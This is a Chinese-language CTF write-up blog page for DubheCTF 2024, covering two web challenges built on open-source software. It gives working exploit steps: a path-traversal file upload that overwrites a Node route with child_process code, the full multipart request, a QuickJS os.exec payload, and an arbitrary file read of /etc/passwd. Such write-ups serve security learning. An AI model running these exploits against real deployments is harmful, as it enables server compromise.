@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="google-site-verification" content="kDP0Dxs1_nBan7wIjoDmFGV34uwZ0l0hwkRGuuJUe2g" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zoiltin.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="DubheCTF 2024 WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DubheCTF 2024 WP">
+<meta property="og:url" content="https://zoiltin.github.io/2024/03/19/DubheCTF-2024-WP/index.html">
+<meta property="og:site_name" content="Zoiltin&#39;s Blog">
+<meta property="og:description" content="DubheCTF 2024 WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zoiltin.github.io/images/wecat.png">
+<meta property="og:image" content="https://zoiltin.github.io/images/sub.png">
+<meta property="article:published_time" content="2024-03-19T01:00:01.000Z">
+<meta property="article:modified_time" content="2024-03-19T06:32:37.356Z">
+<meta property="article:author" content="Zoiltin">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="DubheCTF 2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zoiltin.github.io/images/wecat.png">
+
+<link rel="canonical" href="https://zoiltin.github.io/2024/03/19/DubheCTF-2024-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DubheCTF 2024 WP | Zoiltin's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Zoiltin's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-friends"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zoiltin.github.io/2024/03/19/DubheCTF-2024-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Zoiltin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zoiltin's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DubheCTF 2024 WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-19 09:00:01 / 修改时间：14:32:37" itemprop="dateCreated datePublished" datetime="2024-03-19T09:00:01+08:00">2024-03-19</time>
+            </span>
+
+          
+            <div class="post-description">DubheCTF 2024 WP</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Wecat"><a href="#Wecat" class="headerlink" title="Wecat"></a>Wecat</h3><blockquote>
+<p>分数：370</p>
+</blockquote>
+<p>一个网页版的即时通讯程序。源码：<a target="_blank" rel="noopener" href="https://github.com/imzusheng/Wechat-Wecat">https://github.com/imzusheng/Wechat-Wecat</a><br>package.json里指定了服务的启动方式，Dockerfile里使用dev方式启动。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;dev&quot;: &quot;cross-env NODE_ENV=development nodemon app.js&quot;</span><br></pre></td></tr></table></figure>
+<p>这种启动方式node可以热加载，就是说在服务运行过程中修改js文件的话，node服务会自动重启来加载更新。<br>对于node来说，webshell不能像php那样上传一个js文件就可以。需要覆盖原来的js文件并在启用了热加载的情况下才能加载恶意代码。<br>upload.js关键代码：没有过滤，可以目录穿越，存在任意文件上传（覆盖）。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api</span> &#123;<span class="type">Post</span>&#125; /wechatAPI/upload/once 上传文件 单次</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiName</span> 4</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiVersion</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiGroup</span> 上传文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiSampleRequest</span> <span class="variable">off</span></span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiParam</span> FormData 包含的额外数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiParam</span> FormData.hash hash</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiParam</span> FormData.postfix 文件后缀，如&#x27;png&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiSuccessExample</span> 成功响应示例</span></span><br><span class="line"><span class="comment"> * &#123;</span></span><br><span class="line"><span class="comment"> *   &quot;error&quot;: false,</span></span><br><span class="line"><span class="comment"> *   &quot;filePath&quot;: &quot;&quot;, // 服务器文件名</span></span><br><span class="line"><span class="comment"> *   &quot;name&quot;: &quot;&quot;, // 文件名</span></span><br><span class="line"><span class="comment"> *   &quot;message&quot;: &quot;&quot;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/wechatAPI/upload/once&#x27;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;</span><br><span class="line">    name,</span><br><span class="line">    hash, <span class="comment">// 文件hash值</span></span><br><span class="line">    postfix</span><br><span class="line">  &#125; = ctx.<span class="property">request</span>.<span class="property">body</span></span><br><span class="line">  <span class="keyword">let</span> error = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">let</span> message</span><br><span class="line">  <span class="keyword">const</span> file = ctx.<span class="property">request</span>.<span class="property">files</span>.<span class="property">file</span></span><br><span class="line">  <span class="keyword">const</span> fileName = <span class="string">`avatar_<span class="subst">$&#123;hash&#125;</span>.<span class="subst">$&#123;postfix&#125;</span>`</span> <span class="comment">// 文件名字</span></span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(config.<span class="property">staticPath</span>, fileName)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>)</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(filePath, reader)</span><br><span class="line">    message = <span class="string">&#x27;上传成功&#x27;</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    error = <span class="literal">true</span></span><br><span class="line">    message = e</span><br><span class="line">  &#125;</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    name,</span><br><span class="line">    fileName,</span><br><span class="line">    error,</span><br><span class="line">    message</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>综上，我们可以上传恶意js文件覆盖源文件来重写相关web路由，相当于代码执行。<br>可以尝试覆盖server\server\src\route\commonRouter.js<br>恶意js文件：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;@koa/router&#x27;</span>)()</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/wechatAPI/common/chatHistory&#x27;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;touch /tmp/poc&quot;</span>,<span class="keyword">function</span>(<span class="params">err,stdout,stderr</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(stdout);&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span></span><br><span class="line">  .<span class="property">exports</span> = router.<span class="title function_">routes</span>()</span><br></pre></td></tr></table></figure>
+<p>访问&#x2F;wechatAPI&#x2F;common&#x2F;chatHistory即可rce。注意需要登录。<br>顺便一提注册页面发到邮箱的验证码是前端验证，http的response包里面就有验证码（经典逻辑漏洞）。<br>burp发包覆盖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;avatar.js&quot;</span><br><span class="line">Content-Type: application/x-javascript</span><br><span class="line"></span><br><span class="line">const router = require(&#x27;@koa/router&#x27;)()</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/wechatAPI/common/chatHistory&#x27;, async (ctx) =&gt; &#123;</span><br><span class="line">  require(&quot;child_process&quot;).exec(&quot;touch /tmp/poc&quot;,function(err,stdout,stderr)&#123;console.log(stdout);&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">module</span><br><span class="line">  .exports = router.routes()</span><br><span class="line">------WebKitFormBoundaryqvOwIyxcgf41e5sZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">avatar.js</span><br><span class="line">------WebKitFormBoundaryqvOwIyxcgf41e5sZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;hash&quot;</span><br><span class="line"></span><br><span class="line">/../../src/route/commonRouter</span><br><span class="line">------WebKitFormBoundaryqvOwIyxcgf41e5sZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;postfix&quot;</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">------WebKitFormBoundaryqvOwIyxcgf41e5sZ--</span><br></pre></td></tr></table></figure>
+<p>登录后访问&#x2F;wechatAPI&#x2F;common&#x2F;chatHistory即可执行命令。<br><img src="/../images/wecat.png" alt="wecat"></p>
+<h3 id="Master-of-Profile"><a href="#Master-of-Profile" class="headerlink" title="Master of Profile"></a>Master of Profile</h3><blockquote>
+<p>分数：512</p>
+</blockquote>
+<p>一个C++写的程序。<br>官方文档：<a target="_blank" rel="noopener" href="https://github.com/tindy2013/subconverter/blob/master/README-cn.md">https://github.com/tindy2013/subconverter/blob/master/README-cn.md</a><br>路由(main.cpp)：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/version&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;subconverter &quot;</span> VERSION <span class="string">&quot; backend\n&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/refreshrules&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!global.accessToken.<span class="built_in">empty</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            std::string token = <span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(token != global.accessToken)</span><br><span class="line">            &#123;</span><br><span class="line">                response.status_code = <span class="number">403</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Forbidden\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done\n&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/readconf&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!global.accessToken.<span class="built_in">empty</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            std::string token = <span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(token != global.accessToken)</span><br><span class="line">            &#123;</span><br><span class="line">                response.status_code = <span class="number">403</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Forbidden\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">readConf</span>();</span><br><span class="line">        <span class="keyword">if</span>(!global.updateRulesetOnRequest)</span><br><span class="line">            <span class="built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done\n&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/updateconf&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!global.accessToken.<span class="built_in">empty</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            std::string token = <span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(token != global.accessToken)</span><br><span class="line">            &#123;</span><br><span class="line">                response.status_code = <span class="number">403</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Forbidden\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        std::string type = <span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;type&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(type == <span class="string">&quot;form&quot;</span>)</span><br><span class="line">            <span class="built_in">fileWrite</span>(global.prefPath, <span class="built_in">getFormData</span>(request.postdata), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;direct&quot;</span>)</span><br><span class="line">            <span class="built_in">fileWrite</span>(global.prefPath, request.postdata, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            response.status_code = <span class="number">501</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Not Implemented\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">readConf</span>();</span><br><span class="line">        <span class="keyword">if</span>(!global.updateRulesetOnRequest)</span><br><span class="line">            <span class="built_in">refreshRulesets</span>(global.customRulesets, global.rulesetsContent);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done\n&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/flushcache&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;token&quot;</span>) != global.accessToken)</span><br><span class="line">        &#123;</span><br><span class="line">            response.status_code = <span class="number">403</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">flushCache</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/sub&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, subconverter);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;/sub&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, subconverter);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/sub2clashr&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, simpleToClashR);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/surge2clash&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, surgeConfToClash);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/getruleset&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, getRuleset);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/getprofile&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, getProfile);</span><br><span class="line"></span><br><span class="line">    webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/render&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, renderTemplate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!global.APIMode)</span><br><span class="line">    &#123;</span><br><span class="line">        webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/get&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">        &#123;</span><br><span class="line">            std::string url = <span class="built_in">urlDecode</span>(<span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;url&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">webGet</span>(url, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        webServer.<span class="built_in">append_response</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/getlocal&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>, [](RESPONSE_CALLBACK_ARGS) -&gt; std::string</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">fileGet</span>(<span class="built_in">urlDecode</span>(<span class="built_in">getUrlArg</span>(request.argument, <span class="string">&quot;path&quot;</span>)));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>读文档可知&#x2F;getprofile路由可以执行任意javascript代码。</p>
+<blockquote>
+<p>enable_filter<br>设置为所有节点使用自定义的js代码进行筛选<br>当值为 true 时, 为所有节点使用自定义的js代码进行筛选, 为 false 时不使用。<br>filter_script<br>为所有节点使用自定义的js函数进行筛选<br>可设置为js代码内容，也可为本地js文件的路径<br>js函数包括一个参数，即一个节点，函数返回为true时保留该节点，返回为false时丢弃该节点<br>例如:<br>仅保留加密方式为chacha20的节点<br>filter_script&#x3D;function filter(node) {\n    if(node.EncryptMethod.includes(‘chacha20’))\n        return true;\n    return false;\n}</p>
+</blockquote>
+<p>简单来讲就是enable_filter传参为true，filter_script传参为js代码，写一个filter(node)函数，服务器会将节点信息用参数node传入filter函数，判断此节点是否过滤。</p>
+<p>服务器使用quickjs作为javascript引擎。没有child_process那些nodejs里的那些module，但是quickjs内置了std和os模块。官方文档：<a target="_blank" rel="noopener" href="https://bellard.org/quickjs/quickjs.html#os-module">https://bellard.org/quickjs/quickjs.html#os-module</a></p>
+<blockquote>
+<p>The <code>os</code> module provides Operating System specific functions:<br>The OS functions usually return 0 if OK or an OS specific negative error code.<br>Available exports:<br><code>exec(args[, options])</code>Execute a process with the arguments <code>args</code>. <code>options</code> is an object containing optional parameters:</p>
+</blockquote>
+<p>在os模块中存在exec函数。可以rce。不过文档似乎很久没更新了，有些语法不对，通过不断本地试错得出exp：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">filter</span>(<span class="params">node</span>) &#123;<span class="keyword">import</span> (<span class="string">&#x27;os&#x27;</span>);os.<span class="title function_">exec</span>([<span class="string">&#x27;ash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;touch /tmp/poc&#x27;</span>]);&#125;</span><br></pre></td></tr></table></figure>
+<p>有个坑，用bash没反应，可以读&#x2F;etc&#x2F;shells看看，系统有一个ash，通过这个shell可以执行命令。<br>ash好像没办法反弹shell，也有可能是不出网，所以可以把flag写到&#x2F;tmp&#x2F;res里，再通过getlocal读取&#x2F;tmp&#x2F;res。</p>
+<p>访问&#x2F;getprofile路由时需要传参token。<br>在&#x2F;getlocal路由可以读取任意文件，所以可以通过getlocal读取配置文件拿token。<br>payload:<code>/getlocal?name=/etc/passwd</code></p>
+<p>在官方文档中关于配置文件的部分：</p>
+<blockquote>
